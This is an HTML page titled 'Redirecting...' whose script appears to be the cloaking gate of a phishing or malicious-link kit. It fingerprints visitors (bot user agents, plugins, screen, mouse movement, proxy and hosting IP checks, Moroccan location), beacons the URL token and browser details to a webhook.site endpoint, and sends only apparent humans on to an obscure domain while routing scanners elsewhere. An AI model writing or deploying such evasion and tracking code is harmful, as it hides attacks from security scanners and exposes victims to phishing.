<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    window.addEventListener("load", function () {
      const hash = window.location.hash ? window.location.hash.substring(1) : null;
      const ua = navigator.userAgent || "";
      const uaClean = ua.toLowerCase().replace(/\s+/g, '');
      let isBot = false;
      let isProxy = false;
      let isHosting = false;
      let isMorocco = false;

      // Basic UA-based bot check
      if (
        uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
        uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot")
      ) {
        isBot = true;
      }

      // JS and localStorage test
      try {
        localStorage.setItem("js-check", "1");
        if (localStorage.getItem("js-check") !== "1") isBot = true;
      } catch {
        isBot = true;
      }

      // Plugin/screen tests
      if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
        isBot = true;
      }

      let moved = false;
      window.addEventListener("mousemove", () => moved = true);

      // IP check
      fetch("https://ipapi.co/json?key=F74e0gpSdeUEaF4")
        .then(res => res.json())
        .then(data => {
          const org = (data.org || "").toLowerCase();
          if (data.proxy === true || data.hosting === true) {
            isBot = true;
          }
          if (data.country === "MA") {
            isMorocco = true;
          }

          if (!hash) {
            window.location.href = "https://google.com";
            return;
          }

          // Log to webhook
          const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
          const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&proxy=${data.proxy}&hosting=${data.hosting}&country=${data.country}&ts=${Date.now()}`;
          const img = new Image();
          img.src = fullLogUrl;

          setTimeout(() => {
            if (isMorocco) {
              window.location.href = "https://www.maroc.ma";
            } else if (isBot || !moved) {
              window.location.href = "https://yelp.com";
            } else {
              window.location.replace(`https://szliyi.com/${hash}`);
            }
          }, 2500);
        })
        .catch(() => {
          // On IPAPI fail, fallback
          if (!hash) {
            window.location.href = "https://google.com";
          } else {
            window.location.replace(`https://szliyi.com/${hash}`);
          }
        });
    });
  </script>
</head>
<body></body>
</html>
